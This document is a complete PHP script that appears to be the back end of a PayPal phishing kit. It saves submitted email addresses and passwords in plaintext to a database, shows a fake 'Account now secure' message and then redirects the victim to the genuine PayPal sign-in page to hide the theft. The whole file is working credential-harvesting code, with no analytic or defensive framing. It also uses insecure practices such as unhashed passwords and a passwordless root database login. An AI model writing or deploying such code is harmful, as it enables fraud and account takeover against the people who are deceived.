<?php
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "udata";

$conn = new mysqli($servername, $username, $password, $dbname);

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $email = $_POST['email'];
    $userPassword = $_POST['password'];

    // You may want to perform additional validation on email and password here

    $stmt = $conn->prepare("INSERT INTO users (email, password) VALUES (?, ?)");
    $stmt->bind_param("ss", $email, $userPassword);

    if ($stmt->execute()) {
        // Display success message in a pop-up window
        echo "<script>
                alert('Account now secure. Click OK to continue.');
                window.location.href = 'https://www.paypal.com/signin/';
              </script>";
    } else {
        //echo "Error: " . $stmt->error;
    }

    $stmt->close();
}

$conn->close();
?>
